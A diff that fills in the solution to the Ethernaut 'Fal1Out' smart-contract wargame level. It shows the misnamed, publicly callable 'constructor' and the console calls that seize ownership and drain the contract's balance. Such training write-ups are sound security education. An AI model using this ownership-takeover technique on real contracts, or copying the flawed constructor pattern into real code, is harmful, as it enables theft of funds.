@@ -1,6 +1,6 @@
 ---
 title: "Fal1Out"
-tags: [""]
+tags: ["Constructor"]
 reference: https://ethernaut.openzeppelin.com/level/0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639
 ---
 
@@ -56,4 +56,36 @@ contract Fallout {
 
 # Solution
 
-todo
+
+1. found that anyone can call the "constructor"
+
+- so anyone can change the ownership to himself
+
+```
+    /* constructor */
+    function Fal1out() public payable {
+        owner = msg.sender;
+        allocations[owner] = msg.value;
+    }
+```
+
+2. become owner
+
+```
+contract.Fal1out()
+Promise {<pending>, _events: i, emit: ƒ, on: ƒ, …}
+```
+
+3. get contract balance
+
+```
+contract.collectAllocations()
+Promise {<pending>, _events: i, emit: ƒ, on: ƒ, …}
+```
+
+4. check contract balance
+
+```
+await getBalance(instance)
+'0'
+```
